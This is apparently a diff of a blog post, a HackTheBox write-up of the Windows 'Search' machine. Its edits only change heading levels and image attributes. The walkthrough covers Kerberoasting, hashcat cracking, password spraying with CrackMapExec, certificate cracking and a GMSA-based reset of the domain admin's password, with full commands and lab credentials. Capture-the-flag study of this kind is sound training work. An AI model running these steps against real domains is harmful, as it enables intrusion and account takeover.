@@ -8,14 +8,14 @@ tags: ["hackthebox"]
 ---
 
 <p>The Search machine on HackTheBox has just retired! This is my write-up for Search on HackTheBox. Here I detail the penetration testing steps taken to scan, exploit, and privilege escalate on this target machine. This machine is Windows, categorized as hard, and was retired on April 30, 2022.</p>
-<h3>Search Summary</h3>
-<figure><img src="/writeups/hackthebox-search-write-up/img-1.png" alt="Search Avatar" /></figure>
-<h3>Target Information</h3>
+<h2>Search Summary</h2>
+<figure><img src="/writeups/hackthebox-search-write-up/img-1.png" alt="Search Avatar"  decoding="async" width="300" height="300" loading="eager" fetchpriority="high" /></figure>
+<h2>Target Information</h2>
 <p><a href="https://app.hackthebox.com/machines/Search"><strong>Machine Page</strong></a><br><strong>IP Address:</strong> 10.10.11.129<br><strong>Hostname:</strong> search.htb</p>
-<h3>Synopsis</h3>
+<h2>Synopsis</h2>
 <p>A website on a domain controller exposes multiple usernames and a password. Kerberoasting works for a username and password combination to crack another service password in plaintext. This service password can be used to access another user’s account and download an Excel file with more usernames and passwords. One of these new username and password combinations gives access to a new user containing the user flag and some certificate files. The certificate files can be cracked and used to access a PowerShell Web Console on the web server. Using the PowerShell console, a GMSA password read attack can be used to change the domain administrator’s password and fully escalate to the domain admin.</p>
-<h3>Scanning</h3>
-<h4>Nmap</h4>
+<h2>Scanning</h2>
+<h3>Nmap</h3>
 <p>The Nmap scan shows that there is an HTTP server on port <code>80/tcp</code> and <code>443/tcp</code> . All of the ports/services typically associated with a domain controller like port <code>464/tcp</code> and <code>636/tcp</code> are also present, suggesting this server is a domain controller.</p>
 <pre><code># nmap -sV -sC -p- 10.10.11.129
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-29 18:26 EDT
@@ -83,7 +83,7 @@ Host script results:
 |_  start_date: N/A
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 334.05 seconds</code></pre>
-<h4>Gobuster</h4>
+<h3>Gobuster</h3>
 <p>A gobuster directory fuzzing scan shows an interesting <code>/staff</code> directory for us to check out.</p>
 <pre><code># gobuster dir -u http://search.htb/ -w /usr/share/wordlists/dirpwn.txt
 ===============================================================
@@ -114,19 +114,19 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 /index.html           (Status: 200) [Size: 44982]                                                          
 /js                   (Status: 301) [Size: 144] [--&gt; http://search.htb/js/]                                                                                         
 /staff                (Status: 403) [Size: 1233]</code></pre>
-<h4>Staff Page</h4>
+<h3>Staff Page</h3>
 <p>We receive a <code>403 Forbidden</code> status code from the <code>/staff</code> directory. We'll have to come back to this later with some kind of credentials.</p>
-<figure><img src="/writeups/hackthebox-search-write-up/img-2.png" alt="Access denied to /staff." /><figcaption>Access denied to /staff.</figcaption></figure>
-<h4>Main Site</h4>
+<figure><img src="/writeups/hackthebox-search-write-up/img-2.png" alt="Access denied to /staff."  decoding="async" width="754" height="241" loading="lazy" /><figcaption>Access denied to /staff.</figcaption></figure>
+<h3>Main Site</h3>
 <p>The main site is a basic IIS web server with some small bits of customization that we should look at.</p>
-<figure><img src="/writeups/hackthebox-search-write-up/img-3.png" alt="Main site landing page." /><figcaption>Main site landing page.</figcaption></figure>
+<figure><img src="/writeups/hackthebox-search-write-up/img-3.png" alt="Main site landing page."  decoding="async" width="1170" height="245" loading="lazy" /><figcaption>Main site landing page.</figcaption></figure>
 <p>One interesting piece of information is a potential username and password contained in a note in a photo.</p>
-<figure><img src="/writeups/hackthebox-search-write-up/img-4.png" alt="Features section with notes image." /><figcaption>Features section with notes image.</figcaption></figure>
+<figure><img src="/writeups/hackthebox-search-write-up/img-4.png" alt="Features section with notes image."  decoding="async" width="768" height="496" loading="lazy" /><figcaption>Features section with notes image.</figcaption></figure>
 <p>When zooming in we can see a potential domain username of <code>Hope.Sharp</code> and a password of <code>IsolationIsKey?</code>.</p>
-<figure><img src="/writeups/hackthebox-search-write-up/img-5.png" alt="Notes image zoomed to reveal username and password." /><figcaption>Notes image zoomed to reveal username and password.</figcaption></figure>
+<figure><img src="/writeups/hackthebox-search-write-up/img-5.png" alt="Notes image zoomed to reveal username and password."  decoding="async" width="456" height="248" loading="lazy" /><figcaption>Notes image zoomed to reveal username and password.</figcaption></figure>
 <p>Some additional potential usernames can be found from the “Our Team” section of the website.</p>
-<figure><img src="/writeups/hackthebox-search-write-up/img-6.png" alt="Our Team section revealing multiple possible user names." /><figcaption>Our Team section revealing multiple possible user names.</figcaption></figure>
-<h3>Initial Access</h3>
+<figure><img src="/writeups/hackthebox-search-write-up/img-6.png" alt="Our Team section revealing multiple possible user names."  decoding="async" width="768" height="565" loading="lazy" /><figcaption>Our Team section revealing multiple possible user names.</figcaption></figure>
+<h2>Initial Access</h2>
 <p>Using the first username and password we found for Hope Sharp, we can attempt to list SMB shares.</p>
 <pre><code># smbclient -L //search.htb/ -U Hope.Sharp                                                                                                            
 Enter WORKGROUP\Hope.Sharp's password: 
@@ -178,11 +178,11 @@ ServicePrincipalName               Name     MemberOf  PasswordLastSet           
 RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 08:59:11.329031  &lt;never&gt;               
 $krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$a37ba59ac4a33a73ff132c9604b05b3f$b6a18d2138a59054260bbe599d192b915b32869fb037720350cf162cbb0a02a1b304cf30a9eb92c0df751dc7efba9b80c563f49a72afcc972c3f3fa1dee275a600bad29a65144d53e24a01dffeae20a1c10edbce89885488e3cad2a22b0d44a231e35a88447111ec09f7d1ee48c7781272d8eabc6187f3739c3cdf9d80415c442593292778f364b74cfd35bcdbb782e8bc3819179a19158d8666fa1b882356f00c77d79e47623c1fb05d7b2df7c01e97ecc0eba584e00078beeeac430437274d543cd6b031b24c2d78844843af32bd1b74deb6222692aa98655483b6724dd76f5731cd6d6a9e75dc8632c427f71044d0ac9124eaf3d59c138064109854349dd9a43800d7b510d1b47da1118fd5c06677625de131081965477ecc4d9aaa8611b6da7ec226613fd40aa405450a11e8bf09b5646171aa34ff1543ab496a11ca8d07c13f4710b7ae3720b01151f01be3561f75c33f3341247f9805797e3eef9eae1e3119303269221a150ce5e9f6281e9a410dca202ba5c0a4cb43d7a757d17dfe1278ca9624999d0548a4ff7f969f9cb9bf350b3cef8475e1ec90246944acc6b0fd555a4216145f4af29083018385c3ffd09942fcf7c9037c54af092d4049553d6c9b480521e0c811f7e8773e3740be990624db828e902bab49c2c7d56cce30c0eb5763d7ce8fdfa82724c188d11d9d1343cb54ee795924857c0e60716cc48006ad5a299cbbd3da1ea1b348cddc175159095b21395180e205bafa2665d5c069a99449f2b4c43a7d52b302b30319ee2dc595e58ab7e341dec1cc984001311573f71308336c6d5d6c2ecdf3cc6b2b2b0a1d64463813c6eba7afc5f57e66487cae38bf8df41cbb17b79f86b9f59f29712a60d224ce94730e8c9a6a3948a785c84d38c423f9bc39e9e4886b65067af08d8653888a1bb54ca24a193caeba56d44b04ae19de4359d7a29b205a49abd33ee2072c4c43fef26c513be7443f9d195ecb6433b857ee74cb37e2dce7124bf5ce7c688e3f579d4b5bbc7a4a05a5dac267993fd784228dc11139612db085fb32d974322de9d4db42fbe66b5b6fd7134fba5324d4c33a4465d61a93a3953593ac5dc61b7bbf7399a9229f5131a4c7f20b68eac6c83e6e21b4900fb7015f2a0c0cdd5e312432be1d1aa88693fea6d8e2ee71f98fd1159ce79aaae1d95bdff3a4fb5366a274ee51a69b20014e76dc5089fdf5027d77efd976629e3309ed87565e2da55cca9f239a38dac8ecfdb535a870183db0fce978e5318628ea63fc80c76fbe1c1b63554e41384269477727551c028dbe07e041705c3a6e1a92037bdca439ca377c560c4a88e8ff0928122c2148c8a0fd94c989a777dcc5eb53482c3d2d0526a0271420bc7256d3ad0584d2bc26942bfbb6f7f33657671d7fe0717e3404b7e6b8e3050845f7653c8971ed59d6021177b9ebea2e83d45976bd87f34fbbdbc931a710c4a21f59f442d7c3</code></pre>
 <p>We get a hash! Looks like we’ve found our path to exploitation.</p>
-<h3>Exploit</h3>
-<h4>Kerberos Cracking</h4>
+<h2>Exploit</h2>
+<h3>Kerberos Cracking</h3>
 <p>Using <a href="https://github.com/hashcat/hashcat">Hashcat</a>, we can attempt to crack the hash we previously found.</p>
 <pre><code>.\hashcat.exe -m 13100 .\krb.txt ..\wordlists\rockyou.txt</code></pre>
-<figure><img src="/writeups/hackthebox-search-write-up/img-7.png" alt="Hashcat cracking hash successfully." /><figcaption>Hashcat cracking hash successfully.</figcaption></figure>
+<figure><img src="/writeups/hackthebox-search-write-up/img-7.png" alt="Hashcat cracking hash successfully."  decoding="async" width="768" height="381" loading="lazy" /><figcaption>Hashcat cracking hash successfully.</figcaption></figure>
 <p>We were able to successfully crack the hash to find the plaintext password of <code>@3ONEmillionbaby</code>!</p>
 <p>Although we have this password for a service account, we have to see if this password is used for any users that can login. Using <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a>, we can provide a list of users that we’ve collected and the password we cracked to identify a valid combination of credentials.</p>
 <pre><code># crackmapexec smb search.htb -u users.txt -p '@3ONEmillionbaby' --continue-on-success                                                                
@@ -250,7 +250,7 @@ smb: \&gt; ls sierra.frye\Desktop\
   desktop.ini                      AHSc      282  Fri Jul 31 10:42:15 2020
   Microsoft Edge.lnk                 Ac     1450  Tue Apr  7 08:28:05 2020
   user.txt                           Ac       33  Wed Nov 17 19:55:27 2021</code></pre>
-<h3>Enumeration</h3>
+<h2>Enumeration</h2>
 <p>In Sierra Frye’s <code>Downloads</code> directory there are two interesting files we can download.</p>
 <pre><code>smb: \&gt; cd sierra.frye\Downloads\Backups\
 smb: \sierra.frye\Downloads\Backups\&gt; ls
@@ -277,15 +277,15 @@ Version: 1.0 (n/a) - 04/29/22 - Evi1cg
 2022/04/29 19:47:47 -&gt;  [+] Password found ==&gt; misspissy
 2022/04/29 19:47:47 -&gt;  [*] Successfully cracked password after 5484392 attempts!</code></pre>
 <p>The tool was able to successfully crack the password for the plaintext password of <code>misspissy</code>. We can verify the password works by simply trying to open the P12 file on our system.</p>
-<figure><img src="/writeups/hackthebox-search-write-up/img-8.png" alt="Successful opening of P12 file using password." /><figcaption>Successful opening of P12 file using password.</figcaption></figure>
+<figure><img src="/writeups/hackthebox-search-write-up/img-8.png" alt="Successful opening of P12 file using password."  decoding="async" width="521" height="503" loading="lazy" /><figcaption>Successful opening of P12 file using password.</figcaption></figure>
 <p>Now we need to import both files into Firefox to use them to authenticate to the website. Visiting <a href="preferences#privacy">about:preferences#privacy</a> in Firefox leads us to the Certificate Manager. Both the P12 and PFX files should be imported using the discovered password.</p>
-<figure><img src="/writeups/hackthebox-search-write-up/img-9.png" alt="Importing P12 and PFX file into Firefox Certificate Manager." /><figcaption>Importing P12 and PFX file into Firefox Certificate Manager.</figcaption></figure>
+<figure><img src="/writeups/hackthebox-search-write-up/img-9.png" alt="Importing P12 and PFX file into Firefox Certificate Manager."  decoding="async" width="689" height="484" loading="lazy" /><figcaption>Importing P12 and PFX file into Firefox Certificate Manager.</figcaption></figure>
 <p>Now when we visit the <code>/staff</code> directory we can authenticate!</p>
-<figure><img src="/writeups/hackthebox-search-write-up/img-10.png" alt="Successful authentication to /staff website directory." /><figcaption>Successful authentication to /staff website directory.</figcaption></figure>
+<figure><img src="/writeups/hackthebox-search-write-up/img-10.png" alt="Successful authentication to /staff website directory."  decoding="async" width="596" height="497" loading="lazy" /><figcaption>Successful authentication to /staff website directory.</figcaption></figure>
 <p>The site ends up showing PowerShell Web Access. Perfect for easy code execution, and we already have valid credentials for login.</p>
-<figure><img src="/writeups/hackthebox-search-write-up/img-11.png" alt="Logging into PowerShell Web Access." /><figcaption>Logging into PowerShell Web Access.</figcaption></figure>
+<figure><img src="/writeups/hackthebox-search-write-up/img-11.png" alt="Logging into PowerShell Web Access."  decoding="async" width="871" height="523" loading="lazy" /><figcaption>Logging into PowerShell Web Access.</figcaption></figure>
 <p>After logging in we can interact with a PowerShell session as Sierra Frye.</p>
-<figure><img src="/writeups/hackthebox-search-write-up/img-12.png" alt="Successful command execution in PowerShell Web Access." /><figcaption>Successful command execution in PowerShell Web Access.</figcaption></figure>
+<figure><img src="/writeups/hackthebox-search-write-up/img-12.png" alt="Successful command execution in PowerShell Web Access."  decoding="async" width="886" height="167" loading="lazy" /><figcaption>Successful command execution in PowerShell Web Access.</figcaption></figure>
 <p>One of the first things to check is the groups Sierra Frye is in. An interesting group is the <code>ITSec</code> group in multiple locations.</p>
 <pre><code>PS C:\Temp&gt; net group
 Group Accounts for \\
@@ -345,7 +345,7 @@ PS C:\Users\Sierra.Frye\Documents&gt; $cred = New-Object System.Management.Autom
 PS C:\Users\Sierra.Frye\Documents&gt; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {net user Tristan.Davies NewPassword! /domain}
 The command completed successfully.</code></pre>
 <p>We have successfully reset the domain administrator Tristan Davies’ password to our own password <code>NewPassword!</code>.</p>
-<h3>Root</h3>
+<h2>Root</h2>
 <p>With the domain administrator’s password changed, let’s log into SMB and grab root.txt!</p>
 <pre><code># smbclient //search.htb/C$ -U Tristan.Davies                                                                                                       
 Enter WORKGROUP\Tristan.Davies's password: 
@@ -359,7 +359,7 @@ smb: \Users\Administrator\Desktop\&gt; ls
                 3246079 blocks of size 4096. 536323 blocks available
 smb: \Users\Administrator\Desktop\&gt; get root.txt
 getting file \Users\Administrator\Desktop\root.txt of size 34 as root.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)</code></pre>
-<h3>Loot</h3>
+<h2>Loot</h2>
 <p>Other than the points on HackTheBox, the lessons learned are the real treasures for this box.</p>
 <ol><li>BloodHound is an extremely powerful tool. It gives us the most likely attack vector and the shortest path to domain administrator. In this case I didn’t go into depth with documenting BloodHound, but I plan to in a future post. For now, check out <a href="https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/">this guide</a>.</li><li>Never underestimate the exposure of just a username. With just the usernames available on the website and other easy to access locations we were able to make a lot of progress on this box.</li></ol>
 <p>Thank you for reading my write-up for the Search machine on HackTheBox. Be sure to check out my other write-ups for <a href="/notes?tag=hackthebox">HackTheBox</a>!</p>
